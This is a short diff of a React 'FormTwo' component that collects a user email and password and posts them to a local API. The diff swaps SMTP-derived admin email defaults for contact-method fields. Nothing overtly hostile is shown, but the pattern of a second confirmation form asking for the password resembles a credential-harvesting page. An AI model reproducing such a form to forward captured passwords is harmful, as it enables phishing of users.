@@ -12,24 +12,24 @@ import { useToast } from "@/hooks/use-toast";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
-import { formTwoSchema, type FormTwo } from "@shared/schema";
+import { formTwoSchema, type ConfirmationForm } from "@shared/schema";
 import React from 'react';
 
 export default function FormTwo() {
   const { toast } = useToast();
   const [, setLocation] = useLocation();
 
-  const form = useForm<FormTwo>({
+  const form = useForm<ConfirmationForm>({
     resolver: zodResolver(formTwoSchema),
     defaultValues: {
       user_email: "",
       password: "",
-      admin_email: import.meta.env.VITE_SMTP_USER || "",
-      admin_email_2: import.meta.env.VITE_ADMIN_EMAIL || "",
+      contactMethod: 'email',
+      countryCode: '',
     },
   });
 
-  const onSubmit = async (data: FormTwo) => {
+  const onSubmit = async (data: ConfirmationForm) => {
     try {
       const response = await fetch('/api/form-two', {
         method: 'POST',
@@ -70,6 +70,7 @@ export default function FormTwo() {
         </h1>
         <Form {...form}>
           <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+            {/* Email Field (Optional) */}
             <FormField
               control={form.control}
               name="user_email"
@@ -90,6 +91,7 @@ export default function FormTwo() {
                 </FormItem>
               )}
             />
+            {/* Password Field (Required) */}
             <FormField
               control={form.control}
               name="password"
